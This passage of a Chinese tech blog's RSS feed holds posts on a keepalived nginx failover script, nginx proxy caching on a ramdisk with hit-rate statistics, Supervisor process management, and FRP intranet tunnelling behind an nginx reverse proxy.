class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">counter=$(ps -C nginx --no-heading|wc -l)</span><br><span class="line">if [ "$&#123;counter&#125;" = "0" ]; then</span><br><span class="line">    /usr/local/nginx/sbin/nginx</span><br><span class="line">    sleep 2</span><br><span class="line">    counter=$(ps -C nginx --no-heading|wc -l)</span><br><span class="line">    if [ "$&#123;counter&#125;" = "0" ]; then</span><br><span class="line">        /etc/init.d/keepalived stop</span><br><span class="line">    fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><hr><p>至此，基于进程监控的 Keepalive 已经实现。</p><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>这里用 Keepalive 实现了一个 VIP 下的双机热备，和实际业务需求更加接近了一点。当然真实架构不是这样的，这样导致了，从机的完全的空闲，其压测效果还不如两个机器分别在 upstream里面。后面将会使用 Docker集群进行统一管理。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/03/01/OP_KeepAlive%E5%AE%9E%E7%8E%B0HA/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Proxy 缓存 及 命中率统计</title>
      <link>https://www.diglp.xyz/2019/02/28/OP_%E4%BB%A3%E7%90%86%E7%BC%93%E5%AD%98_%E5%91%BD%E4%B8%AD%E7%8E%87%E7%BB%9F%E8%AE%A1/</link>
      <guid>https://www.diglp.xyz/2019/02/28/OP_%E4%BB%A3%E7%90%86%E7%BC%93%E5%AD%98_%E5%91%BD%E4%B8%AD%E7%8E%87%E7%BB%9F%E8%AE%A1/</guid>
      <pubDate>Wed, 27 Feb 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;车能跑之后，就希望跑的快点对吧？所以就想办法开始对其性能进行优化。 这里就使用
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>车能跑之后，就希望跑的快点对吧？所以就想办法开始对其性能进行优化。 这里就使用 CDN的思想，对代理的静态文件进行缓存，实现访问速度的提升。</p><p>所以这篇的主要目的，就是配置主机的 CDN 功能，实现对页面的静态文件缓存。</p><h2 id="proxy-cache-配置"><a href="#proxy-cache-配置" class="headerlink" title="proxy_cache 配置"></a>proxy_cache 配置</h2><p>由于Nginx里面默认是编译了 Cache 的功能， 所以可以很方便的通过配置，来实现功能。这里直接贴出conf的内容。这里需要指定缓存空间，以及缓存配置。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxy_cache_path</span> /tmp/ramdisk levels=<span class="number">1</span>:<span class="number">2</span> keys_zone=my_zone:<span class="number">64m</span> inactive=<span class="number">24h</span> max_size=<span class="number">64m</span>;</span><br><span class="line"><span class="attribute">proxy_cache_key</span> <span class="string">"<span class="variable">$scheme</span><span class="variable">$request_method</span><span class="variable">$host</span><span class="variable">$request_uri</span>"</span>;</span><br></pre></td></tr></table></figure><p>这里是在 HTTP 域里面进行的缓存空间的配置。</p><hr><p>下面，就是通过正则匹配来实现，不同静态资源的统一缓存。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ .*\.(gif|jpg|png|html|htm|css|js|ico|swf|pdf)$</span> &#123;</span><br><span class="line"><span class="comment"># 部分不需要走缓存</span></span><br><span class="line">    <span class="comment"># proxy_cache_bypass  $http_cache_control;</span></span><br><span class="line">    <span class="attribute">proxy_set_header</span>            Host <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_ignore_headers</span> Set-Cookie Cache-Control;   </span><br><span class="line">    <span class="attribute">proxy_set_header</span>            X-real-ip <span class="variable">$remote_addr</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span>            X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">proxy_pass</span> https://frpcon;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Use Proxy Cache</span></span><br><span class="line">    <span class="attribute">proxy_cache</span> my_zone;<span class="comment"># 缓存空间指定</span></span><br><span class="line">    <span class="attribute">proxy_cache_key</span> <span class="string">"<span class="variable">$host</span><span class="variable">$request_uri</span>"</span>; <span class="comment"># 键存储方式  </span></span><br><span class="line">    <span class="attribute">add_header</span> Cache <span class="string">"<span class="variable">$upstream_cache_status</span>"</span>; <span class="comment"># 返回头添加字段，说明命中状态</span></span><br><span class="line">    <span class="attribute">proxy_cache_valid</span>  <span class="number">200</span> <span class="number">304</span> <span class="number">301</span> <span class="number">302</span> <span class="number">8h</span>;<span class="comment"># 不同返回码的有效时间</span></span><br><span class="line">    <span class="attribute">proxy_cache_valid</span>  <span class="number">404</span> <span class="number">1m</span>;</span><br><span class="line">    <span class="attribute">proxy_cache_valid</span>  any <span class="number">2d</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p> <span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAxMjY4MDQ1Mw==" title="https://segmentfault.com/a/1190000012680453">nginx proxy cache配置参数解读<i class="fa fa-external-link"></i></span> 这里是一篇 相关配置参数的说明</p></blockquote><hr><p>如上配置完成之后，reload server ，缓存功能理应启动。</p><h2 id="热数据思想"><a href="#热数据思想" class="headerlink" title="热数据思想"></a>热数据思想</h2><p>冷热数据分离的思想，常伴在身，虽然这里的请求量是微乎其微，不过还是建一个概念功能。Cache 的请求量一定是非常高的，所以才会被 cache。涉及到IO的时候，最快的设备可能就是我们的内存了。</p><p>所以这里直接使用<strong>内存盘</strong> 对数据来进行缓存，这样的化，大大的降低了物理磁盘的IO量，而且也大大提升了缓存性能。</p><hr><p>在linux下实现一个内存盘是相当的简单：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/ramdisk# 创建挂载点</span><br><span class="line">mount  -t tmpfs -o size=64m  myramdisk /tmp/ramdisk # 实现内存盘挂载</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###### 测速 #####</span></span></span><br><span class="line">➜  /tmp sudo dd if=/dev/zero of=/tmp/ramdisk/zero bs=4k count=100</span><br><span class="line">100+0 records in</span><br><span class="line">100+0 records out</span><br><span class="line">409600 bytes (410 kB) copied, 0.000243897 s, 1.7 GB/s</span><br></pre></td></tr></table></figure><p>这里顺便进行了测速，可见速度还是相当的满意的。至此内存盘的配置完毕。</p><hr><p>当然如果要实现自动挂载，需要在 <code>fstab</code> 里面进行配置.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myramdisk/tmp/ramdisktmpfsdefaults00</span><br></pre></td></tr></table></figure><p>至此配置完毕。</p><h2 id="命中率统计"><a href="#命中率统计" class="headerlink" title="命中率统计"></a>命中率统计</h2><h3 id="日志配置"><a href="#日志配置" class="headerlink" title="日志配置"></a>日志配置</h3><p>关于命中率的统计这里还是通过在日志里面实现的。和之前的一篇一样，通过 shell 脚本对日志进行提取得到我们需要的数据。</p><p>不过在这里，需要对日志个事进行设定，使其能提供我们需要的信息：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">log_format</span>  proxy <span class="string">'<span class="variable">$remote_addr</span> - <span class="variable">$remote_user</span> [<span class="variable">$time_local</span>] "<span class="variable">$request</span>" '</span></span><br><span class="line"><span class="string">'<span class="variable">$status</span> <span class="variable">$body_bytes_sent</span> "<span class="variable">$http_referer</span>" '</span></span><br><span class="line"><span class="string">'"<span class="variable">$http_user_agent</span>" "<span class="variable">$http_x_forwarded_for</span>"'</span></span><br><span class="line"><span class="string">'"<span class="variable">$request_time</span>" "<span class="variable">$upstream_response_time</span>" "<span class="variable">$upstream_cache_status</span>" "<span class="variable">$upstream_addr</span>"'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="attribute">access_log</span> xxxx proxy;<span class="comment"># 这里对格式进行指定。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里在我们的HTTP域里面自定义日志类型</p><h3 id="统计脚本"><a href="#统计脚本" class="headerlink" title="统计脚本"></a>统计脚本</h3><p>学好 awk ，走遍天下都不怕。。。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk '&#123;if($(NF-1)=="\"HIT\"") hit++&#125; END &#123;printf "%.4f%",hit/NR&#125;' /var/log/nginx/xxx.log</span><br></pre></td></tr></table></figure><p>这里，就很精巧的实现了对缓存命中率的统计。后面可以直接合并入之前的接口之中即可。</p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>慢慢装起来一辆能跑快的车，还是不错的。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/02/28/OP_%E4%BB%A3%E7%90%86%E7%BC%93%E5%AD%98_%E5%91%BD%E4%B8%AD%E7%8E%87%E7%BB%9F%E8%AE%A1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Supervisor 进程管理系统</title>
      <link>https://www.diglp.xyz/2019/02/23/OP_Supervisord/</link>
      <guid>https://www.diglp.xyz/2019/02/23/OP_Supervisord/</guid>
      <pubDate>Fri, 22 Feb 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;一台机器东西跑多了，就开始各种混乱了。如果是标准安装的注册了service
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>一台机器东西跑多了，就开始各种混乱了。如果是标准安装的注册了service 的还可以比较容易的进行管理。然而很多组件是后面直接下载二进制文件的。这里一个 <code>nohup</code> ，那里一个。最后只能 ps 找出来。如没运行了，有时候甚至找不到了。自启动也是。</p><p>所以这里就是用 Supervisor  进行统一的进程管理，对添加的进程，的启停，自启等都能有很方便的管理。这篇就做个 basic 的部署使用说明。</p><h2 id="部署及配置"><a href="#部署及配置" class="headerlink" title="部署及配置"></a>部署及配置</h2><p>debian 和 redhat 的风格各自不同，debian直接通过 <code>apt-get</code> 安装即可。redhat 使用pip安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install supervisor</span><br></pre></td></tr></table></figure><p>以上完成，就实现了安装过程。</p><hr><p>一共有两个部分 <code>supervisorctl</code> 和 <code>supervisord</code>。根据其命名可以看出来，一个是控制端，另一个是守护进程。先启动守护进程，并注册开机启动。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable supervisor.service# redhat</span><br><span class="line">update-rc.d supervisor enable# debian</span><br></pre></td></tr></table></figure><p>之后把进程跑起来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ systemctl start supervisord.service               </span><br><span class="line">➜  ~ supervisorctl </span><br><span class="line"><span class="meta">supervisor&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure><p>至此,配置没有问题，部署完成。</p><h2 id="进程配置"><a href="#进程配置" class="headerlink" title="进程配置"></a>进程配置</h2><p>在 <code>/etc/supervisord.d</code> 里面通过 ini文件（conf）进行统一的注册。示例注册如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[program:frps]</span></span><br><span class="line"><span class="attr">command</span>=/***/frp/frps -c frps_full.ini --log_file frps.log</span><br><span class="line"><span class="attr">directory</span>=/***/</span><br><span class="line"><span class="attr">autostart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">startsecs</span>=<span class="number">5</span></span><br><span class="line"><span class="attr">autorestart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">startretries</span>=<span class="number">3</span></span><br><span class="line"><span class="attr">user</span>=root</span><br><span class="line"><span class="attr">redirect_stderr</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">stdout_logfile_maxbytes</span>=<span class="number">20</span>MB</span><br><span class="line"><span class="attr">stdout_logfile_backups</span>=<span class="number">5</span></span><br><span class="line"><span class="attr">stdout_logfile</span>=/data/logs/frps_stdout.log</span><br></pre></td></tr></table></figure><p>这样就完成了一个进程的注册。后面在 ctl 里面进行更新，和操作了，十分方便</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ supervisorctl </span><br><span class="line">frps                             RUNNING   pid 6607, uptime 6:14:01</span><br><span class="line">uwsgi                            RUNNING   pid 6606, uptime 6:14:01</span><br><span class="line"><span class="meta">supervisor&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure><p>至此，一个进程注册完成</p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>这篇文章感觉水水的，不过，挺偏实用向，下面给出 supervisor 的官方手册</p><blockquote><p><span class="exturl" data-url="aHR0cDovL3N1cGVydmlzb3JkLm9yZy9pbmRleC5odG1s" title="http://supervisord.org/index.html">Supervisor: A Process Control System<i class="fa fa-external-link"></i></span></p></blockquote>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/02/23/OP_Supervisord/#disqus_thread</comments>
    </item>
    
    <item>
      <title>另一次内网穿透(reverse proxy)</title>
      <link>https://www.diglp.xyz/2019/02/21/OP_%E5%8F%A6%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F(reverse%20proxy)/</link>
      <guid>https://www.diglp.xyz/2019/02/21/OP_%E5%8F%A6%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F(reverse%20proxy)/</guid>
      <pubDate>Wed, 20 Feb 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;很快这就是第二篇了，上篇信誓旦旦说的更好的方案，实际上，这里较比而已只是有了一点点改进XD&lt;/p&gt;
&lt;p&gt;上一篇：&lt;span
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>很快这就是第二篇了，上篇信誓旦旦说的更好的方案，实际上，这里较比而已只是有了一点点改进XD</p><p>上一篇：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmRpZ2xwLnh5ei8yMDE5LzAyLzIwL09QXyVFNiU4NCU5QSVFOCVBMCVBMiVFNyU5QSU4NCVFNSU4NiU4NSVFNyVCRCU5MSVFNyVBOSVCRiVFOSU4MCU4RiVFNiU5NiVCOSVFNiVBMSU4OCh0dW5uZWw=" title="https://blog.diglp.xyz/2019/02/20/OP_%E6%84%9A%E8%A0%A2%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%96%B9%E6%A1%88(tunnel">愚蠢的内网穿透方案(tunnel)<i class="fa fa-external-link"></i></span>/) &lt;– 在此</p><p>其目标和目的是一样的，实现页面的内网穿透，以及内网主机的反代。</p><h2 id="方案以及可行性"><a href="#方案以及可行性" class="headerlink" title="方案以及可行性"></a>方案以及可行性</h2><h3 id="可行性"><a href="#可行性" class="headerlink" title="可行性"></a>可行性</h3><p>如上面所说，实际上分了两个部分，内网穿透，以及反向代理。这里实际上有点混淆了一个概念。反向代理实际上是内网穿透的一个实现过程。之于正向代理不同，反向代理是代理服务器在上次，有请求之后，会把请求转发都后排的客户端，所以这就是反向代理的过程。</p><p>那么内网穿透呢？内网穿透是在反向代理的功能上更多了一层。上面提到反向代理，在有连接的时候，会把它直接转发到后面的客户端。但是在穿透这个情况下，内网主机是<strong>无法被公网主机所访问</strong>，从而无法传递请求了。所以我们在反向代理的前提下，<strong>使用客户端向服务器发起TCP长连接</strong>，这样就打通了，公网主机到内网主机之间的通道。从而实现了内网的穿透。</p><blockquote><p>内网穿透 = 反向代理 + 正向连接</p></blockquote><hr><p>下面又是一个反向代理，这个和前面不一样，是七层代理（也就是应用层）HTTP 的七层代理。对Http的请求进行转发。这个转发和上面不同。转发的服务是运行在内网的主机上的。其作用是对公网穿透的主机请求进行到同一内网的主机的转发。</p><p>这里就是实现的是对HTTP的请求的转发。转发主机与lb主机是在同一个可以访问的网段内的。</p><h3 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h3><p>之于上次的傻傻的方法所不同，这次使用现成的轮子了，内网穿透这里直接使用 <code>FRP</code> （Fast reverse proxy）实现，FRP是一个简单易用的内网穿透工具。在公网主机上进行配置。实现内网主机的透传连接。把你穿透到公网主机的开放端口。实现内网主机在公网上的端口访问。</p><p>内网主机使用 <code>Nginx</code> 对目标主机进行 反代，并且把web端口开放在 <code>FRP</code> 的转发上。</p><p>至此方案设计完毕</p><h2 id="部署过程"><a href="#部署过程" class="headerlink" title="部署过程"></a>部署过程</h2><h3 id="FRP的部署"><a href="#FRP的部署" class="headerlink" title="FRP的部署"></a>FRP的部署</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycC9ibG9iL21hc3Rlci9SRUFETUVfemgubWQ=" title="https://github.com/fatedier/frp/blob/master/README_zh.md">FRP项目Readme<i class="fa fa-external-link"></i></span>  这里面对工具的部署和使用做了详尽的说明，我们直接下载对应架构的 FRP 进行使用即可。其中的功能很多。这里我们只需要用到其中的 TCP 透传的功能。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/fatedier/frp.git</span><br></pre></td></tr></table></figure><p>之后直接 make ，就OK了，当然也是推荐使用现有的 Release的版本。</p><h3 id="Nginx-部署"><a href="#Nginx-部署" class="headerlink" title="Nginx 部署"></a>Nginx 部署</h3><p>Nginx 是在大多数的发行版里默认带有的组件，简单性能轻量。</p><h3 id="FRP配置-以及测试"><a href="#FRP配置-以及测试" class="headerlink" title="FRP配置 以及测试"></a>FRP配置 以及测试</h3><h4 id="FRP-配置"><a href="#FRP-配置" class="headerlink" title="FRP 配置"></a>FRP 配置</h4><p>这里只是用到了 FRP 的内穿功能，通过简单的配置文件实现：</p><p>服务端：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">server_port</span> = *<span class="number">000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">token</span> = *******</span><br><span class="line"></span><br><span class="line"><span class="attr">allow_ports</span> = <span class="number">2000</span>-<span class="number">3000</span>,<span class="number">3001</span>,<span class="number">3003</span>,<span class="number">4000</span>-<span class="number">50000</span></span><br></pre></td></tr></table></figure><p>配置简单通俗易懂，配置监听端口，以及连接 token、</p><hr><p>客户端：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = ****.diglp.xyz</span><br><span class="line"><span class="attr">server_port</span> = *<span class="number">000</span></span><br><span class="line"><span class="attr">token</span> = *******</span><br><span class="line"><span class="section">[web]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">443</span></span><br><span class="line"><span class="attr">remote_port</span> = ****</span><br></pre></td></tr></table></figure><p>这里是客户端的配置文件，比较核心的配置在其指定本地端口以及远程端口的两行。指本地的localhost的443端口透传到远程主机的 <code>****</code> 端口。</p><h4 id="FRP-测试连接"><a href="#FRP-测试连接" class="headerlink" title="FRP 测试连接"></a>FRP 测试连接</h4><p>服务端部署，使用 Nohup 使其在后台运行，当然可以注册一个 supervisor。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nohup ./frps -c frps_full.ini --log_file frps.log &amp;</span><br></pre></td></tr></table></figure><p>客户端连接，运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./frpc -c frpc_wan.ini &amp;</span><br></pre></td></tr></table></figure><hr><p>测试连接，这里使用 <code>nc -l</code> 对端口进行监听：</p><p>客户端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 443</span><br></pre></td></tr></table></figure><p>服务端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -XGET localhost:**80</span><br></pre></td></tr></table></figure><p>以此模拟一个 GET 请求。之后在客户端得到如下结果，说明透传成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@vm:~/qspace $ nc -l 443</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">User-Agent: curl/7.29.0</span><br><span class="line">Host: localhost:**80</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure><hr><p>或者：客户端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@vm:~/qspace $ sudo python -m SimpleHTTPServer 443</span><br><span class="line">Serving HTTP on 0.0.0.0 port 443 ...</span><br><span class="line">127.0.0.1 - - [20/Feb/2019 23:29:47] "GET / HTTP/1.1" 200 -</span><br></pre></td></tr></table></figure><p>服务端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  frp_0.23.2 curl -XGET localhost:**80</span><br><span class="line">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Directory listing for /&lt;/title&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h2&gt;Directory listing for /&lt;/h2&gt;</span><br><span class="line">        &lt;hr&gt;</span><br><span class="line">            &lt;ul&gt;</span><br><span class="line">                &lt;li&gt;&lt;a href="frp_0.24.1_linux_arm/"&gt;frp_0.24.1_linux_arm/&lt;/a&gt;</span><br><span class="line">                &lt;li&gt;&lt;a href="frp_0.24.1_linux_arm.tar.gz"&gt;frp_0.24.1_linux_arm.tar.gz&lt;/a&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line">        &lt;hr&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>至此连接测试完成。FRP 功能测试正常。</p><h2 id="Nginx-配置以及测试"><a href="#Nginx-配置以及测试" class="headerlink" title="Nginx 配置以及测试"></a>Nginx 配置以及测试</h2><p>这里用到了 Nginx 的反代功能，在写正确的配置之时，后面也写自己在过程中的尝试和想法XD。</p><p>这里直接把配置贴上来了就</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;                                                                     </span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">443</span> ssl default_server;                             </span><br><span class="line">    <span class="attribute">server_name</span>  _;                                            </span><br><span class="line">    <span class="attribute">root</span>         /usr/share/nginx/html;                                     </span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span>     /etc/nginx/ssl/mine.diglp.xyz.crt;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/nginx/ssl/mine.diglp.xyz.key;</span><br><span class="line">    <span class="attribute">ssl_session_cache</span> shared:SSL:<span class="number">1m</span>;                                        </span><br><span class="line">    <span class="attribute">ssl_session_timeout</span>  <span class="number">10m</span>;                                               </span><br><span class="line">    <span class="attribute">ssl_ciphers</span> HIGH:!aNULL:!MD5;                                           </span><br><span class="line">    <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;                                           </span><br><span class="line"></span><br><span class="line">    <span class="comment"># Load configuration files for the default server block.                </span></span><br><span class="line">    <span class="attribute">location</span> = / &#123;                                                           </span><br><span class="line">    <span class="comment">#internal;                                                              </span></span><br><span class="line">    <span class="comment">#return 403;                                                           </span></span><br><span class="line">    empty_gif;                                                             </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">404</span> /<span class="number">404</span>.html;                                                  </span><br><span class="line">    <span class="attribute">location</span> = /40x.html &#123;                                                 </span><br><span class="line">    &#125;                                                                          </span><br><span class="line"></span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span> /50x.html;                                      </span><br><span class="line">    <span class="attribute">location</span> = /50x.html &#123;                                                 </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;                                                                     </span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">443</span> ssl;                             </span><br><span class="line">    <span class="attribute">server_name</span>  <span class="regexp">xxxk.*</span>**<span class="regexp">*.diglp.xyz</span>;                                            </span><br><span class="line">    <span class="attribute">root</span>         /usr/share/nginx/html;                                     </span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span>     /etc/nginx/ssl/mine.diglp.xyz.crt;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/nginx/ssl/mine.diglp.xyz.key;</span><br><span class="line">    <span class="attribute">ssl_session_cache</span> shared:SSL:<span class="number">1m</span>;                                        </span><br><span class="line">    <span class="attribute">ssl_session_timeout</span>  <span class="number">10m</span>;                                               </span><br><span class="line">    <span 